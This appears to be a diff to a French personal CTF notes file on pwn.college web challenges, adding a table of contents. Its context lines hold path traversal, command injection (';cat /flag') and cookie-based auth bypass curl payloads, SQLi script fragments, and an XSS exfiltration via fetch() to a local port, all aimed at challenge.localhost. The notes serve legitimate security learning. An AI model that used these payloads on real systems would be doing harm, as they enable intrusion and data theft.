@@ -1,4 +1,33 @@
+[🏠 Accueil du repo](../README.md) 
+
 # Notes personnelles — Vulnérabilités Web
+
+Fiches de révision issues des challenges pwn.college (path traversal, injections, XSS, CSRF…).
+
+## Sommaire
+
+- [1. Path Traversal 1](#1-path-traversal-1)
+- [2. Path Traversal 2](#2-path-traversal-2)
+- [3. Command Injection 1 (CMDi-1)](#3-command-injection-1-cmdi-1)
+- [4. Command Injection 2 (CMDi-2)](#4-command-injection-2-cmdi-2)
+- [Notes – CMDi 3](#notes--cmdi-3)
+- [Notes – CMDi 4](#notes--cmdi-4)
+- [Notes – CMDi 5 (Blind Command Injection)](#notes--cmdi-5-blind-command-injection)
+- [Notes – CMDi 6](#notes--cmdi-6)
+- [Notes – Authentication Bypass 2](#notes--authentication-bypass-2)
+- [Fiche de Révision : SQLi1](#fiche-de-révision--sqli1)
+- [Fiche de Révision : Injection SQLi3 de type UNION](#fiche-de-révision--injection-sqli3-de-type-union)
+- [SQLi4](#sqli4)
+- [Fiche de Révision : Blind SQL Injection (Basée sur les booléens)](#fiche-de-révision--blind-sql-injection-basée-sur-les-booléens)
+- [Fiche de Révision : Stored XSS (Cross-Site Scripting Stocké)](#fiche-de-révision--stored-xss-cross-site-scripting-stocké)
+- [Fiche de Révision : Execution de Code JavaScript (Stored XSS)](#fiche-de-révision--execution-de-code-javascript-stored-xss)
+- [Fiche de Révision : Stored XSS & Exfiltration (pwn.college xss-7)](#fiche-de-révision--stored-xss--exfiltration-pwncollege-xss-7)
+- [📌 Fiche de Synthèse : CSRF Level 1](#-fiche-de-synthèse--csrf-level-1)
+- [Fiche de Révision : POST-CSRF (pwn.college csrf-2)](#fiche-de-révision--post-csrf-pwncollege-csrf-2)
+- [✅ Solution CSRF 3](#-solution-csrf-3)
+- [🚀 Ensuite](#-ensuite)
+
+---
 
 Notes de résolution sur des challenges pwn.college / labs persos, par catégorie de vulnérabilité.
 
@@ -30,6 +59,8 @@ mindmap
 
 ---
 
+[⬆ Sommaire](#sommaire)
+
 ## 1. Path Traversal 1
 
 **Principe**  
@@ -52,6 +83,8 @@ Encoder le / en %2F pour que le serveur reçoive vraiment les ../.
 Bash
 
 curl "http://challenge.localhost:80/\<route\>/..%2F..%2Fflag"
+
+[⬆ Sommaire](#sommaire)
 
 ## 2. Path Traversal 2
 
@@ -77,6 +110,8 @@ Bash
 curl
 "http://challenge.localhost:80/\<route\>/fortunes/..%2F..%2F..%2Fflag"
 
+[⬆ Sommaire](#sommaire)
+
 ## 3. Command Injection 1 (CMDi-1)
 
 **Principe**
@@ -96,6 +131,8 @@ Bash
 
 curl
 "http://challenge.localhost:80/\<route\>?\<param\>=/challenge;cat+/flag"
+
+[⬆ Sommaire](#sommaire)
 
 ## 4. Command Injection 2 (CMDi-2)
 
@@ -125,6 +162,8 @@ La commande devient : ls -l / \| cat /flag
 
 **Flag obtenu** :  
 pwn.college{I7TgvdoLd2fUGJpHvbSkAYCitPE.QX0YTN2wyN2MDM5EzW}
+
+[⬆ Sommaire](#sommaire)
 
 ## Notes – CMDi 3
 
@@ -194,6 +233,8 @@ ls -l '/';cat /flag''
 
 Il y a **toujours** une ' à la fin de la commande.
 
+[⬆ Sommaire](#sommaire)
+
 ## Notes – CMDi 4
 
 **Principe**
@@ -216,6 +257,8 @@ command = f"TZ={arg} date"
 Bash
 
 curl "http://challenge.localhost:80/event?tzid=;cat+/flag"
+
+[⬆ Sommaire](#sommaire)
 
 ## Notes – CMDi 5 (Blind Command Injection)
 
@@ -249,6 +292,8 @@ curl
 *\# 3. Lire le fichier*
 
 cat /tmp/flag.txt
+
+[⬆ Sommaire](#sommaire)
 
 ## Notes – CMDi 6
 
@@ -313,6 +358,8 @@ Bash
 
 curl "http://challenge.localhost:80/?session_user=admin"
 
+[⬆ Sommaire](#sommaire)
+
 ## Notes – Authentication Bypass 2
 
 **Principe**
@@ -337,6 +384,8 @@ afficher le flag
 Bash
 
 curl -b "session_user=admin" "http://challenge.localhost:80/"
+
+[⬆ Sommaire](#sommaire)
 
 ## Fiche de Révision : SQLi1
 
@@ -468,6 +517,8 @@ curl "http://challenge.localhost/logon" \\
 
 Voici la fiche de récapitulatif pour ce troisième niveau.
 
+[⬆ Sommaire](#sommaire)
+
 ## Fiche de Révision : Injection SQLi3 de type UNION
 
 ### 1. Contexte & Analyse du Code
@@ -535,6 +586,8 @@ curl
 
 -H "Host: challenge.localhost"
 
+[⬆ Sommaire](#sommaire)
+
 ## SQLi4
 
 ### Step 1: Extract the Randomized Table Name
@@ -581,6 +634,8 @@ curl
 1).*
 
 SQLi5
+
+[⬆ Sommaire](#sommaire)
 
 ## Fiche de Révision : Blind SQL Injection (Basée sur les booléens)
 
@@ -678,6 +733,8 @@ if not found_char:
 
 break
 
+[⬆ Sommaire](#sommaire)
+
 ## Fiche de Révision : Stored XSS (Cross-Site Scripting Stocké)
 
 ### 1. Contexte & Problématique
@@ -756,6 +813,8 @@ curl -X POST "http://challenge.localhost/" \\
 Bash
 
 /challenge/victim "http://challenge.localhost/"
+
+[⬆ Sommaire](#sommaire)
 
 ## Fiche de Révision : Execution de Code JavaScript (Stored XSS)
 
@@ -1067,6 +1126,8 @@ associé au fetch() en **POST vers 0.0.0.0:6969** était la clé absolue
 pour contourner les problèmes d'interprétation des caractères spéciaux
 par curl et la politique réseau du navigateur.
 
+[⬆ Sommaire](#sommaire)
+
 ## Fiche de Révision : Stored XSS & Exfiltration (pwn.college xss-7)
 
 ### 1. Pourquoi l'attaque a fonctionné (Analyse du Payload gagnant)
@@ -1140,6 +1201,8 @@ pwn.college{MRMFYOmxRWa_d5ESIYJ0NgRtzvC.QXygTN2wyN2MDM5EzW}
 
 Voici une fiche de récapitulatif synthétique pour le laboratoire **CSRF
 Level 1**.
+
+[⬆ Sommaire](#sommaire)
 
 ## 📌 Fiche de Synthèse : CSRF Level 1
 
@@ -1235,6 +1298,8 @@ curl -s -b cookies.txt "http://challenge.localhost/" \\
 
 -H "Host: challenge.localhost" \| grep -oE "pwn.college\\\[^}\]+\\"
 
+[⬆ Sommaire](#sommaire)
+
 ## Fiche de Révision : POST-CSRF (pwn.college csrf-2)
 
 ### 1. Pourquoi l'attaque a fonctionné (Analyse du Payload)
@@ -1293,6 +1358,8 @@ document.getElementById('csrfForm').submit();
 
 5.  Connexion avec le compte hacker et extraction du flag sur l'accueil
     authentifié.
+
+[⬆ Sommaire](#sommaire)
 
 ## ✅ Solution CSRF 3
 
@@ -1366,6 +1433,8 @@ Le hint officiel explique précisément pourquoi : si tu écris directement
 navigateur peut considérer ce \</script\> comme la fermeture de ton
 propre script.
 
+[⬆ Sommaire](#sommaire)
+
 ## 🚀 Ensuite
 
 Lance le serveur :
@@ -1393,3 +1462,4 @@ et surtout :
 Success!
 
 ou directement la validation du challenge.
+
